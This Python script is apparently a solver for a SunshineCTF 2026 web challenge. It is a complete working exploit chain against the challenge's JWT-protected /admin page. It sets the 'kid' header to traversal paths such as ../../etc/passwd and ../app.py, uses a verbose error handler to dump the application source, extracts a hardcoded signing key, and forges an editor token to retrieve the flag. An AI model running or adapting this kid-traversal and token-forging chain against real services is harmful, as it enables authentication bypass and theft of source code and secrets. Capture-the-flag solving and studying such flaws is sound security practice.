#!/usr/bin/env python3
"""
You Are Kidding Me — SunshineCTF 2026 (web, 500 pts) — solver

Chain:
  1. show that /admin resolves the JWT verification key from /app/keys/<kid>
     (path traversal via the kid header; verbose error messages).
  2. kid=../app.py -> the error handler dumps non-"protected" file contents,
     leaking the full app source (incl. the hardcoded EDITOR_KEY).
  3. forge {role: editor} with kid=editor.key signed by EDITOR_KEY -> /admin
     returns the flag.

Usage: python3 solver.py [base_url]
Deps:  requests
"""

import base64
import hashlib
import html
import hmac
import json
import re
import sys
import time

import requests

BASE = (sys.argv[1] if len(sys.argv) > 1
        else "https://kidding.web.2026.sunshinectf.games").rstrip("/")
FLAG_RE = re.compile(r"sun\{[^}\s]+\}")


def b64(obj):
    raw = obj if isinstance(obj, bytes) else json.dumps(obj).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def make_token(kid, claims, key=None):
    """JWT with HS256; sign with `key` if given, else placeholder sig."""
    header = {"alg": "HS256", "kid": kid, "typ": "JWT"}
    h, p = b64(header), b64(claims)
    sig = "AAAA"
    if key is not None:
        raw = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
        sig = base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
    return f"{h}.{p}.{sig}"


def admin_page(token, retries=6):
    for i in range(retries):
        r = requests.get(f"{BASE}/admin", cookies={"token": token}, timeout=30)
        if r.status_code != 502:          # backend sometimes crashes; wait it out
            return r
        time.sleep(8)
    raise RuntimeError("backend keeps returning 502")


def text(html):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]*>", " ", html))


def main():
    # 1) kid is a filename under /app/keys
    r = admin_page(make_token("definitely-not-a-key", {"sub": "x", "role": "editor"}))
    assert "KEY LOAD FAILED" in r.text, "expected verbose key-load error"
    print("[+] /admin loads the HMAC key from /app/keys/<kid> (kid = filename)")

    r = admin_page(make_token("../../etc/passwd", {"sub": "x", "role": "editor"}))
    assert "PASS REJECTED" in r.text, "traversal should reach /etc/passwd"
    print("[+] path traversal works (kid=../../etc/passwd used as key file)")

    # 2) error handler dumps file contents for non-protected paths -> app.py
    r = admin_page(make_token("../app.py", {"sub": "x", "role": "editor"}))
    m = re.search(r'<pre id="disclosed" class="disclosed">(.*?)</pre>', r.text, re.S)
    assert m, "source disclosure failed"
    src = html.unescape(m.group(1))
    open("app_dump.txt", "w").write(src)
    print(f"[+] dumped /app/app.py ({len(src)} bytes) -> app_dump.txt")

    km = re.search(r"EDITOR_KEY = b'([^']+)'", src)
    editor_key = km.group(1).encode()
    print(f"[+] hardcoded EDITOR_KEY: {editor_key.decode()}")

    # 3) forge an editor pass
    token = make_token("editor.key", {"sub": "editor-in-chief", "role": "editor"},
                       key=editor_key)
    r = admin_page(token)
    assert r.status_code == 200, f"editor pass rejected: HTTP {r.status_code}"
    flag = FLAG_RE.search(text(r.text))
    assert flag, "flag not present on /admin"
    print(f"[+] FLAG: {flag.group(0)}")


if __name__ == "__main__":
    main()
